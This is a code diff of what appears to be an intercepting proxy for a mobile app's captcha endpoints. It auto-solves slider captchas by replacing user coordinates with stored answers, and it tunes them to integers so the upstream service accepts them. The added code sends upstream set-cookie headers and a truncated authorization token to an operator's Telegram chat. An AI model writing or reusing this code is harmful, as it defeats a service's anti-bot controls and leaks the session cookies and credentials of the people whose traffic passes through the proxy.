@@ -2251,7 +2251,14 @@ app.all('/app/captcha/new', async (req, res) => {
       } else {
         preview = (respBody || `<binary ${respBuffer.length}b>`).substring(0, 1000);
       }
-      bot.sendMessage(data.adminChatId, `🆕 Captcha New\n📥 STATUS: ${response.status}\n🔑 STORED ANSWER: ${answerStored || '(none)'}\n\n📥 RESPONSE (truncated):\n${preview.substring(0,1500)}`).catch(()=>{});
+      const newRespHdrs = {};
+      for (const [k, v] of Object.entries(respHeaders)) {
+        const kl = k.toLowerCase();
+        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
+          newRespHdrs[kl] = v;
+        }
+      }
+      bot.sendMessage(data.adminChatId, `🆕 Captcha New\n📥 STATUS: ${response.status}\n🔑 STORED ANSWER: ${answerStored || '(none)'}\n\n📥 UPSTREAM HEADERS:\n${JSON.stringify(newRespHdrs, null, 2).substring(0, 600)}\n\n📥 RESPONSE (truncated):\n${preview.substring(0,1000)}`).catch(()=>{});
       try {
         if (jsonResp && jsonResp.data && jsonResp.data.master_image_base64) {
           const m = String(jsonResp.data.master_image_base64).match(/^data:image\/[a-z]+;base64,(.+)$/i);
@@ -2281,15 +2288,18 @@ app.post('/app/captcha/verify', async (req, res) => {
     const data = await loadData();
     const body = req.parsedBody || {};
     const inKey = body.captchaKey || body.captcha_key;
+    const passthrough = req.query && (req.query.nosolve === '1' || req.query.passthrough === '1');
     let autoSolved = '';
     let originalReq = { x: body.x, y: body.y };
 
-    if (inKey) {
+    if (inKey && !passthrough) {
       const got = await getCaptchaAnswer(inKey);
       const ans = got.ans;
       if (ans) {
-        const jitter = (Math.random() * 1.6) - 0.8;
-        const newBody = { ...body, x: ans.x + jitter, y: ans.y };
+        // Send INTEGER x (mobile app sends integer pixel coords; upstream may type-check)
+        const finalX = Math.round(Number(ans.x));
+        const finalY = Math.round(Number(ans.y));
+        const newBody = { ...body, x: finalX, y: finalY };
         if (!newBody.templateId && ans.templateId) newBody.templateId = ans.templateId;
         const newRaw = Buffer.from(JSON.stringify(newBody), 'utf8');
         req.rawBody = newRaw;
@@ -2297,16 +2307,36 @@ app.post('/app/captcha/verify', async (req, res) => {
           req.headers['content-type'] = 'application/json';
         }
         req.parsedBody = newBody;
-        autoSolved = `x:${originalReq.x}->${newBody.x.toFixed(2)} y:${originalReq.y}->${newBody.y} (from=${got.where})`;
+        autoSolved = `x:${originalReq.x}->${finalX} y:${originalReq.y}->${finalY} (from=${got.where})`;
       } else {
         autoSolved = `(no stored answer; lookup=${got.where} key=${inKey.substring(0,12)}...)`;
       }
+    } else if (passthrough) {
+      autoSolved = '(PASSTHROUGH — using user x/y as-is)';
+    }
+
+    // Capture incoming request headers (filtered) for diagnostic
+    const inHeadersFiltered = {};
+    for (const [k, v] of Object.entries(req.headers)) {
+      const kl = k.toLowerCase();
+      if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
+          kl === 'transfer-encoding' || kl === 'accept-encoding' ||
+          kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+      inHeadersFiltered[kl] = (kl === 'authorization' && typeof v === 'string') ? (v.substring(0,18) + '...') : v;
     }
 
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🧩 Captcha Verify\n🔧 AUTO-SOLVE: ${autoSolved || '(no key)'}\n\n📤 REQUEST BODY (sent):\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000)}\n\n📥 RESPONSE:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 1000)}`).catch(()=>{});
+      const respHdrPreview = {};
+      for (const [k, v] of Object.entries(respHeaders)) {
+        const kl = k.toLowerCase();
+        if (kl === 'content-type' || kl === 'set-cookie' || kl.startsWith('x-') || kl === 'date' || kl === 'server' || kl === 'cf-ray') {
+          respHdrPreview[kl] = v;
+        }
+      }
+      const msg = `🧩 Captcha Verify\n🔧 AUTO-SOLVE: ${autoSolved || '(no key)'}\n\n📤 REQUEST HEADERS (proxy→upstream):\n${JSON.stringify(inHeadersFiltered, null, 2).substring(0, 600)}\n\n📤 REQUEST BODY (sent):\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 600)}\n\n📥 RESPONSE STATUS: ${response.status}\n📥 RESPONSE HEADERS:\n${JSON.stringify(respHdrPreview, null, 2).substring(0, 600)}\n\n📥 RESPONSE BODY:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 600)}`;
+      bot.sendMessage(data.adminChatId, msg.substring(0, 4000)).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
